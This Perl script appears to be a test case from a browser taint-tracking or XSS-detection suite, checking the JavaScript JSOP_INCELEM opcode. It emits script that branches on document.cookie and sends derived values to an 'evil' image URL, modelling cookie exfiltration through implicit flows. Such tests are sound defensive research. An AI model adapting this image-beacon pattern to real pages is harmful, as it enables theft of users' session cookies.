#!/usr/bin/perl

require "xss_basic_vars.pl";

$title = "Test JSOP_INCELEM";
$evil = "document.cookie";

require "xss_basic_uses.pl";

require "xss_basic_cookie.pl";

require "xss_basic_header.pl";

require "xss_basic_bodystart.pl";

require "xss_basic_form.pl";

print qq|
    <script type="text/javascript">
    
		// shouldn't be evil 
		var notevil = [2];
		++notevil[0];
		var url = "$imgevilurl?normal=" + notevil[0];
		document.images[0].src = url;
		
		// if with evil val 
		var notevil2 = [2];
		if ($evil) {
			++notevil2[0];
		}
		var url2 = "$imgevilurl?if=" + notevil2[0];
		document.images[1].src = url2;
		
		// normal usage 
		var evil = 2;
		if ($evil) {
			evil = 1;
		}
		var notevil3 = [evil];
		++notevil3[0];
		var url3 = "$imgevilurl?isevil=" + notevil3[0];
		document.images[2].src = url3;
		
    </script>
|;

require "xss_basic_footer.pl";
